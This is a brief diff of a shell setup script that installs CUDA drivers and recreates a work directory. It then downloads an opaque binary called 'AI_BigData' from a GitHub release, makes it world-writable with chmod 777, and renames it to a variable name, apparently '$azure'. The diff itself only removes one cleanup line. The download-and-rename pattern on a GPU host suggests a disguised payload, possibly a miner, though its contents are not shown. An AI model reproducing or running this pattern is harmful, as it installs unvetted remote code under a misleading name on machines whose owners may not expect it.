@@ -15,7 +15,6 @@ sudo apt-get install -y cuda-drivers
 rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/platinum
 wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/AI_BigData
 mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
 mv AI_BigData $azure -n
